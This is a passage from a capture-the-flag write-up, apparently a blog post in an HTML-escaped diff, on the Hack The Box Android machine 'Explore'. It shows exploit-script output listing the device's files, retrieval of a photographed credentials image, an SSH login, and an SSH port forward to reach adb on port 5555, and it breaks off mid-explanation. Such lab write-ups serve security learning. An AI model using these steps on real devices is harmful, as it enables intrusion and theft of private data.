+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;sepolicy&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;357.18 KB (365,756 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_service_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;13.73 KB (14,057 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_seapp_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.28 KB (1,315 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_property_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6.53 KB (6,687 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_hwservice_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;7.04 KB (7,212 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_file_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;23.30 KB (23,863 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.zygote64_32.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;875.00 Bytes (875 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.zygote32.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;511.00 Bytes (511 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.usb.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;5.51 KB (5,646 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.usb.configfs.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;7.51 KB (7,690 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.superuser.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;582.00 Bytes (582 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;29.00 KB (29,697 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.environ.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.04 KB (1,064 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.android_x86_64.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;3.36 KB (3,439 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;2.29 MB (2,401,264 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;fstab.android_x86_64&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;753.00 Bytes (753 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;default.prop&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.09 KB (1,118 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;charger&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;12/31/69 07:00:00 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;bugreports&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;12/31/69 07:00:00 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The &lt;code&gt;grep file&lt;/code&gt; is to exclude folders and list only files, since the output also listed folders (&lt;strong&gt;&amp;ldquo;type&amp;rdquo;:&amp;ldquo;folder&amp;rdquo;&lt;/strong&gt;). The reason i wanted to exclude the folders is that when trying to access them, we get an error page saying that directory listing is forbidden:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/2.png&#34; alt=&#34;Pasted image 20210627115906.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We won&amp;rsquo;t be able to list all the files in a directory, so what we want is to look at every file seperately. We can see on the output that the script managed to find a lot of files, however reading them did not give any meaningful information, so the next step was to list pictures:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python poc.py --cmd listPics --host 10.10.10.247                                                                                                                                                                        
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Executing command: listPics on 10.10.10.247
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Server responded with: &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
+
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;concept.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:38:08 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/concept.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;135.33 KB (138,573 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:37:50 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6.24 KB (6,392 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;creds.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:38:18 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/creds.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.14 MB (1,200,401 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;224_anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:37:21 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/224_anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;124.88 KB (127,876 Bytes)&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;We immediately see an image named &lt;strong&gt;creds.jpg&lt;/strong&gt; located at &lt;strong&gt;/storage/emulated/0/DCIM/creds.jpg&lt;/strong&gt;. Hitting that path on our browser:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/3.png&#34; alt=&#34;Pasted image 20210627093357.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;we get the credentials of a user named Kristi! This a very common bad practice of phone users, taking pictures of their written down credentials, in order to not forget them, something that can lead to a compromise, as seen here.&lt;/p&gt;
+&lt;h1 id=&#34;getting-a-shell-as-kristi&#34;&gt;Getting a shell as Kristi&lt;/h1&gt;
+&lt;p&gt;Since we now have valid credentials, using them to login via ssh is the next logical step:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh kristi@10.10.10.247 -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt;                                                                                                                                                                                                     &lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; ⨯
+Password authentication
+Password: 
+:/ $ whoami
+u0_a76
+:/ $
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;and we get a shell on the device.&lt;/p&gt;
+&lt;h1 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h1&gt;
+&lt;p&gt;After getting a shell on the device, we see that we have limited rights to do pretty much anything. Searching for config files, password files, pictures or any other useful file brought no results. At this point we remember that the nmap scan showed us that the device was listening on port 5555, something that we found out to be a vulnerability that could lead an attacker obtaining root access to the device. At that point we could not do anything about it since it was a filtered port, but now we are inside the device. At first we want to see if the device is indeed listening on this port:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netstat -an &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep LISTEN &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt;                                     
+tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::5555                 :::*                    LISTEN
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;We confirm that the device is listening on port 5555 which means we can again try to connect to it with adb. The problem here though, is that &lt;strong&gt;android-tools-adb&lt;/strong&gt; is not installed on the device. So in order to interact with this port we need to do it from our machine, which has the tools we need installed. Did we not try that before though? The answer is no, because now we have valid ssh credentials and access on the device, which means we can now use port forwarding, in order to connect to port 5555, bypassing any firewall rule that was previously preventing us to do so. To port foward we use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 6666:localhost:5555 kristi@10.10.10.247 -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt; -fN
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Flags explained:&lt;/p&gt;
+&lt;ul&gt;
